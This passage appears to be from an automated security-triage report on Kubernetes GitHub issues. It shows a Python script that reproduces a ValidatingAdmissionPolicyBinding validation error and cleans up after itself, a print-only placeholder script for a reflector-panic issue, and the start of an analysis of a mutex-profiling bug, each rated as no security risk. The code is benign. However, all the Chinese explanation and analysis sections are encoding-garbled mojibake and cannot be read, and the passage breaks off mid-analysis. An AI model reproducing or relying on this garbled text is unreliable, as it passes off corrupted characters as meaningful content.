        elif kind == "CustomResourceDefinition":
             delete_method(name=name, body=client.V1DeleteOptions(grace_period_seconds=0))
        else:
            delete_method(name=name, body=client.V1DeleteOptions(grace_period_seconds=0))
        logging.info(f"Successfully initiated deletion of {kind} '{name}'.")
        # Wait briefly for deletion, especially for CRDs
        if kind == "CustomResourceDefinition":
             time.sleep(5) # Give CRD deletion a bit more time
        else:
             time.sleep(1)

    except ApiException as e:
        if e.status == 404:
            logging.info(f"{kind} '{name}' not found, assumed already deleted.")
        else:
            logging.error(f"Error deleting {kind} '{name}': {e.reason} ({e.status})")
    except Exception as e:
        logging.error(f"An unexpected error occurred during deletion of {kind} '{name}': {e}")


def main():
    """Main function to reproduce the issue."""
    start_time = datetime.datetime.now()
    timeout_seconds = 120  # 2 minutes timeout

    try:
        # Load Kubernetes configuration from default location
        config.load_kube_config()
        api_client = client.ApiClient()
        logging.info("Kubernetes configuration loaded.")
    except Exception as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}")
        sys.exit(1)

    created_resources = [] # Keep track of successfully created resources for cleanup

    try:
        # Create resources one by one
        for resource_details in RESOURCES:
            # Check timeout
            if (datetime.datetime.now() - start_time).total_seconds() > timeout_seconds:
                logging.error("Script timed out.")
                break

            api_instance = getattr(client, resource_details["api"])(api_client)
            create_method = getattr(api_instance, resource_details["method_create"])
            body = yaml.safe_load(resource_details["manifest"])
            name = resource_details["name"]
            kind = resource_details["kind"]

            logging.info(f"Attempting to create {kind} '{name}'...")

            if kind == "ValidatingAdmissionPolicyBinding": # This is the one expected to fail
                try:
                    create_method(body=body)
                    # If it succeeds unexpectedly, log it and add to cleanup
                    logging.warning(f"Unexpected success: {kind} '{name}' created without error.")
                    created_resources.append(resource_details)
                except ApiException as e:
                    if e.status == 422 and "spec.paramRef.parameterNotFoundAction: Required value" in str(e.body):
                        logging.info(f"Successfully reproduced the expected error: Failed to create {kind} '{name}' due to missing 'parameterNotFoundAction'. Error details: {e.reason} ({e.status})")
                        logging.info("Validation Error Body (partial): " + str(e.body)[:200] + "...")
                        print("\nISSUE REPRODUCED SUCCESSFULLY")
                        # Do not add the failed resource to created_resources
                        # Stop processing further resources as the target state (error) is reached
                        break
                    else:
                        # Different error than expected
                        logging.error(f"Failed to create {kind} '{name}' with an unexpected error: {e.reason} ({e.status})")
                        logging.error("Error Body: " + str(e.body))
                        # Still add previous resources for cleanup, but stop processing
                        break
                except Exception as e:
                     logging.error(f"An unexpected non-API exception occurred while creating {kind} '{name}': {e}")
                     break

            else: # Handle creation for other resources normally
                try:
                    if kind == "TestParam":
                        create_method(
                            group=resource_details["group"],
                            version=resource_details["version"],
                            plural=resource_details["plural"],
                            body=body
                        )
                    else:
                        create_method(body=body)

                    logging.info(f"Successfully created {kind} '{name}'.")
                    created_resources.append(resource_details)

                    # Add a small delay, especially after CRD creation
                    if kind == "CustomResourceDefinition":
                        logging.info("Waiting a few seconds for CRD to be established...")
                        time.sleep(5) # Wait for CRD to become available
                    elif kind == "ValidatingAdmissionPolicy":
                        time.sleep(1) # Small delay after policy creation
                    elif kind == "TestParam":
                         time.sleep(1) # Small delay after CR creation


                except ApiException as e:
                    if e.status == 409: # Conflict - Resource already exists
                        logging.warning(f"{kind} '{name}' already exists. Assuming it's usable.")
                        # Add to created_resources for cleanup even if it existed before
                        created_resources.append(resource_details)
                    else:
                        logging.error(f"Failed to create {kind} '{name}': {e.reason} ({e.status})")
                        logging.error("Error Body: " + str(e.body))
                        # Stop processing if a prerequisite fails
                        break
                except Exception as e:
                    logging.error(f"An unexpected non-API exception occurred while creating {kind} '{name}': {e}")
                    break

        # Check timeout after loop
        if (datetime.datetime.now() - start_time).total_seconds() > timeout_seconds:
             logging.error("Script timed out during resource creation.")

    finally:
        # Cleanup phase
        logging.info("\n--- Starting Cleanup Phase ---")
        # Iterate in reverse order of creation
        for resource_details in reversed(created_resources):
             # Check timeout during cleanup
             if (datetime.datetime.now() - start_time).total_seconds() > timeout_seconds:
                 logging.warning("Timeout reached during cleanup. Some resources might remain.")
                 break
             cleanup_resource(api_client, resource_details)

        # Ensure the potentially failed binding is also cleaned up if it somehow got created
        # or if the test needs to run again (by checking if it exists)
        binding_details = next((r for r in RESOURCES if r["kind"] == "ValidatingAdmissionPolicyBinding"), None)
        if binding_details:
             cleanup_resource(api_client, binding_details)


        logging.info("--- Cleanup Phase Finished ---")

# Execute the main function directly
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡ç¼–ç¨‹æ–¹å¼å¤ç°Issueä¸­æè¿°çš„é—®é¢˜ï¼Œå³å°è¯•åœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ªç¼ºå°‘`spec.paramRef.parameterNotFoundAction`å­—æ®µçš„`ValidatingAdmissionPolicyBinding`èµ„æºï¼Œå¹¶éªŒè¯æ˜¯å¦æ”¶åˆ°äº†é¢„æœŸçš„APIéªŒè¯é”™è¯¯ã€‚
2.  **åº“ä¾èµ–**: è„šæœ¬ä½¿ç”¨äº†`kubernetes` Pythonå®¢æˆ·ç«¯åº“æ¥ä¸Kubernetes APIè¿›è¡Œäº¤äº’ï¼Œ`yaml`åº“æ¥è§£ææ¸…å•å­—ç¬¦ä¸²ï¼Œä»¥åŠ`logging`, `time`, `sys`, `datetime`è¿›è¡Œæ—¥å¿—è®°å½•ã€æš‚åœã€ç³»ç»Ÿé€€å‡ºå’Œè¶…æ—¶æ§åˆ¶ã€‚
3.  **èµ„æºå®šä¹‰**: è„šæœ¬å†…ä»¥å­—ç¬¦ä¸²å½¢å¼å®šä¹‰äº†Issueä¸­æä¾›çš„æ‰€æœ‰å››ä¸ªKubernetesèµ„æºæ¸…å•ï¼ˆCRD, Policy, Config CR, Bindingï¼‰ã€‚æ³¨æ„ï¼Œ`BINDING_MANIFEST_INVALID`æ•…æ„çœç•¥äº†`parameterNotFoundAction`å­—æ®µä»¥è§¦å‘é”™è¯¯ã€‚
4.  **æ‰§è¡Œæµç¨‹**:
    *   åŠ è½½æœ¬åœ°`kubeconfig`æ–‡ä»¶ä»¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚
    *   æŒ‰é¡ºåºåˆ›å»ºCRD, `ValidatingAdmissionPolicy`, å’Œ `TestParam` è‡ªå®šä¹‰èµ„æºã€‚è„šæœ¬åŒ…å«é”™è¯¯å¤„ç†ï¼Œä¾‹å¦‚å¤„ç†èµ„æºå·²å­˜åœ¨ï¼ˆ409 Conflictï¼‰çš„æƒ…å†µï¼Œå¹¶åœ¨åˆ›å»ºCRDåç¨ä½œç­‰å¾…ï¼Œç¡®ä¿å…¶è¢«APIæœåŠ¡å™¨è¯†åˆ«ã€‚
    *   å…³é”®æ­¥éª¤æ˜¯å°è¯•åˆ›å»ºæ— æ•ˆçš„`ValidatingAdmissionPolicyBinding`ã€‚è¿™éƒ¨åˆ†ä»£ç è¢«åŒ…è£¹åœ¨`try...except ApiException`å—ä¸­ã€‚
    *   **é”™è¯¯éªŒè¯**: å¦‚æœæ•è·åˆ°`ApiException`ï¼Œè„šæœ¬ä¼šæ£€æŸ¥å¼‚å¸¸çš„çŠ¶æ€ç æ˜¯å¦ä¸º`422`ï¼ˆUnprocessable Entityï¼Œé€šå¸¸è¡¨ç¤ºéªŒè¯é”™è¯¯ï¼‰ä»¥åŠé”™è¯¯ä½“ï¼ˆ`e.body`ï¼‰ä¸­æ˜¯å¦åŒ…å«å…³é”®é”™è¯¯ä¿¡æ¯ `"spec.paramRef.parameterNotFoundAction: Required value"`ã€‚
    *   å¦‚æœé¢„æœŸçš„é”™è¯¯è¢«æ•è·ï¼Œè„šæœ¬ä¼šæ‰“å°æˆåŠŸå¤ç°çš„æ¶ˆæ¯å¹¶åœæ­¢åç»­èµ„æºçš„åˆ›å»ºã€‚
    *   å¦‚æœåˆ›å»ºæ„å¤–æˆåŠŸæˆ–å‘ç”Ÿå…¶ä»–é”™è¯¯ï¼Œè„šæœ¬ä¼šè®°å½•ç›¸åº”çš„è­¦å‘Šæˆ–é”™è¯¯ä¿¡æ¯ã€‚
5.  **æ¸…ç†**: ä½¿ç”¨`finally`å—ç¡®ä¿æ— è®ºè„šæœ¬æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤æ‰€æœ‰åˆ›å»ºçš„èµ„æºï¼ˆæŒ‰åˆ›å»ºé¡ºåºçš„åå‘è¿›è¡Œæ¸…ç†ï¼‰ï¼Œä»¥ä¿æŒé›†ç¾¤çŠ¶æ€æ•´æ´ã€‚æ¸…ç†å‡½æ•°ä¹Ÿå¤„ç†äº†èµ„æºä¸å­˜åœ¨ï¼ˆ404 Not Foundï¼‰çš„å¼‚å¸¸ã€‚
6.  **è¶…æ—¶**: è„šæœ¬åŒ…å«ä¸€ä¸ªç®€å•çš„è¶…æ—¶æœºåˆ¶ï¼ˆ2åˆ†é’Ÿï¼‰ï¼Œä»¥é˜²æ­¢åœ¨æ„å¤–æƒ…å†µä¸‹ï¼ˆå¦‚ç½‘ç»œé—®é¢˜æˆ–é›†ç¾¤å“åº”ç¼“æ…¢ï¼‰æ— é™æœŸæŒ‚èµ·ã€‚
7.  **è¿è¡Œ**: ç›´æ¥æ‰§è¡Œè¯¥Pythonè„šæœ¬å³å¯ã€‚å®ƒä¼šè¿æ¥åˆ°`kubeconfig`é…ç½®çš„å½“å‰Kubernetesä¸Šä¸‹æ–‡ï¼Œå¹¶æ‰§è¡Œä¸Šè¿°æ­¥éª¤ã€‚æˆåŠŸå¤ç°é—®é¢˜æ—¶ï¼Œä¼šè¾“å‡ºæ˜ç¡®çš„æˆåŠŸä¿¡æ¯ã€‚

è¯¥è„šæœ¬éªŒè¯äº†IssueæŠ¥å‘Šçš„ç°è±¡â€”â€”APIæœåŠ¡å™¨ç¡®å®è¦æ±‚åœ¨`paramRef`ä¸­æä¾›`parameterNotFoundAction`å­—æ®µï¼Œç¼ºå°‘è¯¥å­—æ®µä¼šå¯¼è‡´èµ„æºåˆ›å»ºå¤±è´¥ã€‚è¿™ç¡®è®¤äº†Issueæè¿°çš„è¡Œä¸ºï¼Œä½†å¦‚åˆ†ææ‰€è¿°ï¼Œè¿™å¹¶éå®‰å…¨æ¼æ´ã€‚

---


## Issue #130817 Reflector panic doesn't provide any debug information

- Issue é“¾æ¥ï¼š[#130817](https://github.com/kubernetes/kubernetes/issues/130817)

### Issue å†…å®¹

#### What happened?

If code panics with nil pointer exception under reflector it will not provide any information about source of panic.

https://github.com/kubernetes/kubernetes/blob/e7eb076349dbb1343c71da8d31ea208457e6684d/staging/src/k8s.io/client-go/tools/cache/reflector.go#L627-L628

#### What did you expect to happen?

Panic should provide accurate stacktrace information about the source of panic

#### How can we reproduce it (as minimally and precisely as possible)?

Inject a panic reflector code

#### Anything else we need to know?

_No response_

#### Kubernetes version

Any

#### Cloud provider

Nvm

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueä¸»è¦åæ˜ äº†Kubernetes `client-go`åº“ä¸­çš„`Reflector`ç»„ä»¶åœ¨å‘ç”Ÿç©ºæŒ‡é’ˆå¼‚å¸¸ï¼ˆnil pointer exceptionï¼‰å¯¼è‡´panicæ—¶ï¼Œæ²¡æœ‰æä¾›è¶³å¤Ÿè¯¦ç»†çš„å †æ ˆè·Ÿè¸ªä¿¡æ¯ï¼ˆstacktraceï¼‰ï¼Œä½¿å¾—å¼€å‘è€…éš¾ä»¥å®šä½panicçš„æ ¹æºã€‚

å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜æ ¸å¿ƒæ˜¯å…³äºé”™è¯¯å¤„ç†å’Œå¯è°ƒè¯•æ€§ï¼ˆdebuggabilityï¼‰ã€‚å½“ç¨‹åºå‘ç”Ÿå†…éƒ¨é”™è¯¯ï¼ˆæ­¤å¤„ç‰¹æŒ‡ç©ºæŒ‡é’ˆè§£å¼•ç”¨ï¼‰å¹¶å´©æºƒæ—¶ï¼Œç¼ºä¹è¯¦ç»†çš„é”™è¯¯æ¥æºä¿¡æ¯ï¼Œè¿™ä¼šå¢åŠ é—®é¢˜æ’æŸ¥å’Œä¿®å¤çš„éš¾åº¦ã€‚
2.  **å®‰å…¨å½±å“**ï¼š
    *   **ä¿¡æ¯æ³„éœ²**ï¼šIssueæœ¬èº«å¹¶æœªæè¿°ä»»ä½•æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚å®ƒå…³æ³¨çš„æ˜¯*ç¼ºå¤±*ä¿¡æ¯ï¼ˆå †æ ˆè·Ÿè¸ªï¼‰ã€‚
    *   **æ‹’ç»æœåŠ¡ (DoS)**ï¼šè™½ç„¶panicæœ¬èº«ä¼šå¯¼è‡´ä½¿ç”¨è¯¥Reflectorçš„ç»„ä»¶ï¼ˆå¦‚Controllerï¼‰å´©æºƒï¼Œä»è€Œå¯èƒ½å¼•å‘DoSï¼Œä½†Issueçš„æ ¸å¿ƒå…³æ³¨ç‚¹å¹¶éå¦‚ä½•è§¦å‘panicï¼Œè€Œæ˜¯panicå‘ç”Ÿåçš„æ—¥å¿—è¾“å‡ºé—®é¢˜ã€‚è¦è§¦å‘è¿™ä¸ªpanicï¼Œå¾ˆå¯èƒ½éœ€è¦ç‰¹å®šçš„APIå¯¹è±¡çŠ¶æ€æˆ–äº¤äº’ï¼Œè¿™å¯èƒ½éœ€è¦æ”»å‡»è€…å…·æœ‰ä¸€å®šçš„æƒé™ï¼ˆä¾‹å¦‚åˆ›å»ºã€ä¿®æ”¹å¯èƒ½å¯¼è‡´é—®é¢˜çš„èµ„æºï¼‰ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œéœ€è¦æƒé™æ‰èƒ½è§¦å‘çš„DoSé€šå¸¸ä¸åˆ¤å®šä¸ºé«˜é£é™©ã€‚æ­¤å¤–ï¼Œè¯¥Issueå¹¶æ²¡æœ‰æä¾›è§¦å‘panicçš„å…·ä½“æ–¹æ³•ï¼Œä»…æåˆ°â€œæ³¨å…¥ä¸€ä¸ªpanic reflectorä»£ç â€ï¼Œè¿™æ›´åƒæ˜¯å¼€å‘è€…è°ƒè¯•æˆ–æµ‹è¯•åœºæ™¯ã€‚
    *   **æƒé™æå‡/å‘½ä»¤æ‰§è¡Œç­‰**ï¼šä»Issueæè¿°æ¥çœ‹ï¼Œå®Œå…¨ä¸æ¶‰åŠæ­¤ç±»é«˜å±é£é™©ã€‚panicé€šå¸¸å¯¼è‡´è¿›ç¨‹ç»ˆæ­¢ï¼Œè€Œéä»£ç æ‰§è¡Œæˆ–æƒé™æå‡ã€‚
    *   **å¤šç”¨æˆ·å½±å“**ï¼šReflectoré€šå¸¸ç”±æ§åˆ¶å¹³é¢ç»„ä»¶æˆ–Operatorä½¿ç”¨ã€‚ä¸€ä¸ªç»„ä»¶çš„panicå¯èƒ½ä¼šå½±å“å…¶è´Ÿè´£ç®¡ç†çš„èµ„æºæˆ–åŠŸèƒ½ï¼Œä½†ä¸€èˆ¬ä¸ä¼šç›´æ¥è·¨è¶Šæƒé™è¾¹ç•Œå½±å“åˆ°ä¸ç›¸å…³çš„å…¶ä»–ç”¨æˆ·æˆ–ç§Ÿæˆ·çš„è¿è¡Œç¯å¢ƒï¼ˆé™¤éæ˜¯å…±äº«çš„æ ¸å¿ƒç»„ä»¶panicï¼Œä½†è¿™ä»å±äºDoSèŒƒç•´ï¼‰ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬8æ¡ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜ä½æƒé™ç”¨æˆ·èƒ½é€šè¿‡æ­¤å½±å“å…¶ä»–ç”¨æˆ·ã€‚
3.  **é—®é¢˜æ ¹æº**ï¼šé—®é¢˜åœ¨äºä»£ç åº“`client-go`ä¸­`Reflector`çš„é”™è¯¯å¤„ç†é€»è¾‘ï¼ˆå…·ä½“æŒ‡å‘äº†`recover()`åçš„å¤„ç†éƒ¨åˆ†ï¼‰ï¼Œå®ƒæ•è·äº†panicä½†æ²¡æœ‰æœ‰æ•ˆåœ°è®°å½•æˆ–é‡æ–°panicä»¥ä¿ç•™åŸå§‹å †æ ˆä¿¡æ¯ã€‚
4.  **ç»“è®º**ï¼šè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªè½¯ä»¶å¥å£®æ€§/å¯ç»´æŠ¤æ€§é—®é¢˜ï¼Œè€Œéä¸€ä¸ªå¯ä»¥ç›´æ¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚è™½ç„¶åº•å±‚çš„panicå¯èƒ½æ„æˆDoSé£é™©ï¼Œä½†Issueæœ¬èº«å…³æ³¨çš„æ˜¯è¯Šæ–­ä¿¡æ¯çš„ç¼ºå¤±ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡ï¼Œè¯¥é—®é¢˜åº”åˆ¤å®šä¸ºéå®‰å…¨é—®é¢˜ã€‚å³ä½¿è€ƒè™‘æ½œåœ¨çš„DoSï¼Œä¹Ÿå› å¯èƒ½éœ€è¦æƒé™ï¼ˆæ ‡å‡†5ï¼‰è€Œä¸åˆ¤å®šä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯å…³äº panic å‘ç”Ÿæ—¶ç¼ºä¹è°ƒè¯•ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸€ä¸ªæ—¥å¿—è®°å½•å’Œé”™è¯¯å¤„ç†çš„é—®é¢˜ï¼Œ
# è€Œä¸æ˜¯ä¸€ä¸ªå¯ä»¥é€šè¿‡å¤–éƒ¨äº¤äº’ç›´æ¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚
# è§¦å‘ç©ºæŒ‡é’ˆ panic æœ¬èº«å¯èƒ½éœ€è¦ç‰¹å®šçš„ Kubernetes èµ„æºçŠ¶æ€æˆ–äº¤äº’ï¼Œ
# è¿™é€šå¸¸ä¾èµ–äºå…·ä½“çš„ Controller/Operator å®ç°ä»¥åŠé›†ç¾¤çŠ¶æ€ï¼Œéš¾ä»¥ç¼–å†™é€šç”¨çš„ POCã€‚
# æ­¤å¤–ï¼Œè¯¥ Issue çš„æ ¸å¿ƒå¹¶éå¦‚ä½•è§¦å‘ panicï¼Œè€Œæ˜¯ panic å‘ç”Ÿåçš„æ—¥å¿—è¾“å‡ºé—®é¢˜ã€‚
# å› æ­¤ï¼Œæ— æ³•ä¹Ÿæ— éœ€ç¼–å†™é’ˆå¯¹æ­¤ Issue æè¿°é—®é¢˜çš„ã€å…·æœ‰å®‰å…¨æ„ä¹‰çš„å¤ç° POCã€‚
#
# ä»¥ä¸‹ä»…ä¸ºç¤ºæ„ä»£ç ï¼Œè¯´æ˜å¦‚ä½•ä½¿ç”¨ client-go (æ¦‚å¿µä¸Šï¼Œéå®é™…è¿è¡Œ)
# å¹¶éå¤ç° Issue ä¸­æè¿°çš„ "ç¼ºä¹è°ƒè¯•ä¿¡æ¯" çš„é—®é¢˜æœ¬èº«ã€‚

# import kubernetes
#
# # å‡è®¾é…ç½®åœ¨é»˜è®¤ä½ç½® ~/.kube/config
# try:
#     kubernetes.config.load_kube_config()
# except kubernetes.config.ConfigException as e:
#     print(f"æ— æ³•åŠ è½½ kubeconfig: {e}")
#     print("è¯·ç¡®ä¿ kubeconfig æ–‡ä»¶å­˜åœ¨äºé»˜è®¤ä½ç½®æˆ–é…ç½®æ­£ç¡®ã€‚")
#     exit(1)
#
# v1 = kubernetes.client.CoreV1Api()
#
# # æ¦‚å¿µæ€§ä»£ç ï¼šå¦‚æœ client-go çš„ Reflector å†…éƒ¨å­˜åœ¨ä¸€ä¸ªæœªå¤„ç†çš„ç©ºæŒ‡é’ˆé£é™©ï¼Œ
# # å¹¶ä¸”æŸä¸ª Watch æ“ä½œè§¦å‘äº†è¯¥é£é™©ï¼Œåˆ™ç›¸å…³è¿›ç¨‹ä¼š panicã€‚
# # è¿™ä¸ª POC æ— æ³•æ¨¡æ‹Ÿ client-go å†…éƒ¨çš„ç©ºæŒ‡é’ˆå¼‚å¸¸åŠå…¶é”™è¯¯å¤„ç†é€»è¾‘ã€‚
#
# print("è¯¥ Issue æè¿°çš„æ˜¯ panic åçš„è°ƒè¯•ä¿¡æ¯ä¸è¶³é—®é¢˜ï¼Œæ— æ³•é€šè¿‡å¤–éƒ¨ POC å¤ç°ã€‚")
# print("æ­¤è„šæœ¬ä»…ä½œå ä½ç¬¦ï¼Œä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚")

def main():
    print("è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ Go ä»£ç åº“å†…éƒ¨ panic æ—¶æ—¥å¿—ä¿¡æ¯ä¸è¶³ï¼Œå±äºä»£ç å¯ç»´æŠ¤æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚")
    print("æ— æ³•ç¼–å†™ Python POC æ¥å¤ç° Go ä»£ç åº“å†…éƒ¨çš„ panic å¤„ç†é€»è¾‘é—®é¢˜ã€‚")
    print("é£é™©è¯„çº§ä¸º 'ä¸æ¶‰åŠ'ï¼Œæ— éœ€ POCã€‚")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueçš„æ ¸å¿ƒé—®é¢˜æ˜¯`client-go`åº“ä¸­`Reflector`ç»„ä»¶åœ¨å†…éƒ¨å‘ç”Ÿpanicï¼ˆç‰¹åˆ«æ˜¯ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰æ—¶ï¼Œå…¶`recover`é€»è¾‘æ²¡æœ‰æœ‰æ•ˆåœ°ä¿ç•™å’ŒæŠ¥å‘ŠåŸå§‹çš„å †æ ˆè·Ÿè¸ªä¿¡æ¯ï¼Œå¯¼è‡´å¼€å‘è€…éš¾ä»¥è°ƒè¯•å’Œå®šä½é—®é¢˜çš„æ ¹æœ¬åŸå› ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè½¯ä»¶å·¥ç¨‹ä¸­çš„å¯è°ƒè¯•æ€§ï¼ˆdebuggabilityï¼‰å’Œé”™è¯¯æŠ¥å‘Šï¼ˆerror reportingï¼‰é—®é¢˜ã€‚

ç”±äºä»¥ä¸‹åŸå› ï¼Œæ­¤é—®é¢˜è¢«è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼š
1.  **éå®‰å…¨æ¼æ´**ï¼šé—®é¢˜æœ¬èº«ï¼ˆç¼ºä¹è°ƒè¯•ä¿¡æ¯ï¼‰å¹¶ä¸æ„æˆä¸€ä¸ªå¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥ç ´åç³»ç»Ÿå®‰å…¨æ€§çš„æ¼æ´ã€‚å®ƒä¸æ¶‰åŠæœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€æƒé™æå‡æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚
2.  **å…³æ³¨ç‚¹å·®å¼‚**ï¼šIssueå…³æ³¨çš„æ˜¯panicå‘ç”Ÿ*å*çš„ä¿¡æ¯è®°å½•ï¼Œè€Œä¸æ˜¯å¦‚ä½•*è§¦å‘*panicã€‚è™½ç„¶è§¦å‘panicå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œä½†è¿™å¹¶éæ­¤IssueæŠ¥å‘Šçš„é‡ç‚¹ã€‚
3.  **æ½œåœ¨DoSçš„å®šæ€§**ï¼šå³ä½¿è€ƒè™‘æ½œåœ¨çš„DoSï¼Œæ ¹æ®æ ‡å‡†5ï¼Œå¦‚æœè§¦å‘éœ€è¦éåªè¯»æƒé™ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡åˆ›å»ºæˆ–ä¿®æ”¹ç‰¹å®šèµ„æºæ¥è¯±å‘Reflectorå¤„ç†é€»è¾‘ä¸­çš„nilæŒ‡é’ˆé”™è¯¯ï¼‰ï¼Œåˆ™ä¸åº”åˆ¤å®šä¸ºé«˜é£é™©ã€‚æ­¤Issueæœªæä¾›è¶³å¤Ÿä¿¡æ¯è¡¨æ˜å¯ä»¥åœ¨æ— æƒé™æˆ–ä½æƒé™ä¸‹è§¦å‘panicã€‚

å› æ­¤ï¼Œæ— éœ€ç¼–å†™å¤ç°POCã€‚æä¾›çš„Pythonè„šæœ¬ä»…ä½œä¸ºå ä½ç¬¦ï¼Œå¹¶è§£é‡Šäº†ä¸ºä»€ä¹ˆæ— æ³•ä¸”æ— éœ€ä¸ºè¿™ä¸ªé—®é¢˜ç¼–å†™POCï¼Œå› ä¸ºå®ƒæè¿°çš„æ˜¯Goä»£ç åº“å†…éƒ¨çš„é”™è¯¯å¤„ç†è¡Œä¸ºï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¯ä»¥é€šè¿‡å¤–éƒ¨Pythonè„šæœ¬è§¦å‘å’Œåˆ©ç”¨çš„å®‰å…¨ç¼ºé™·ã€‚è„šæœ¬æœ¬èº«ä¸æ‰§è¡Œä»»ä½•ä¸Kubernetesäº¤äº’çš„æ“ä½œï¼Œä»…æ‰“å°è¯´æ˜ä¿¡æ¯ã€‚

---


## Issue #130802 Mutex profiling is not configured properly in KCM

- Issue é“¾æ¥ï¼š[#130802](https://github.com/kubernetes/kubernetes/issues/130802)

### Issue å†…å®¹

#### What happened?

Mutex profiling as part of the contention profiling in kube-controller-manager is not working because a prerequite method is not invoked.

#### What did you expect to happen?


We should invoke `SetMutexProfileFraction` before the mutex profiling can be served.
 https://github.com/kubernetes/kubernetes/blob/2261137135631d24248e94dff3bc6375ad9308b2/staging/src/k8s.io/controller-manager/app/serve.go#L63-L65

#### How can we reproduce it (as minimally and precisely as possible)?

Turn on `--profiling=true` and `--contention-profiling=true` in KCM and query `/debug/pprof/mutex` of KCM.

#### Anything else we need to know?

_No response_

#### Kubernetes version

HEAD of master


#### Cloud provider

N/A


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæœ¬è´¨**: è¯¥Issueæè¿°çš„æ˜¯Kubernetesçš„kube-controller-manager (KCM) ç»„ä»¶ä¸­çš„ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ã€‚å…·ä½“æ¥è¯´ï¼Œäº’æ–¥é”åˆ†æï¼ˆMutex profilingï¼‰ä½œä¸ºç«äº‰åˆ†æï¼ˆcontention profilingï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œç”±äºç¼ºå°‘å¯¹`SetMutexProfileFraction`æ–¹æ³•çš„è°ƒç”¨è€Œæ— æ³•æ­£å¸¸å·¥ä½œã€‚
2.  **é—®é¢˜å½±å“**: è¿™ä¸ªç¼ºé™·å¯¼è‡´å¼€å‘è€…æˆ–ç®¡ç†å‘˜æ— æ³•ä½¿ç”¨`/debug/pprof/mutex`ç«¯ç‚¹æ¥è·å–é¢„æœŸçš„äº’æ–¥é”ç«äº‰ä¿¡æ¯ï¼Œå½±å“äº†å¯¹KCMæ€§èƒ½ç“¶é¢ˆè¿›è¡Œè¯Šæ–­å’Œè°ƒè¯•çš„èƒ½åŠ›ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   è¯¥é—®é¢˜æœ¬èº«æ˜¯ä¸€ä¸ª**åŠŸèƒ½ç¼ºå¤±**çš„Bugï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¼•å…¥äº†æ–°çš„æ”»å‡»é¢æˆ–æš´éœ²æ•æ„Ÿä¿¡æ¯çš„æ¼æ´ã€‚pprofç«¯ç‚¹ï¼ˆåŒ…æ‹¬`/debug/pprof/mutex`ï¼‰ç”¨äºæ€§èƒ½åˆ†æå’Œè°ƒè¯•ï¼Œè®¿é—®è¿™äº›ç«¯ç‚¹é€šå¸¸éœ€è¦ç®¡ç†å‘˜æƒé™æˆ–é€šè¿‡å®‰å…¨çš„ç«¯å£è¿›è¡Œè®¿é—®æ§åˆ¶ã€‚
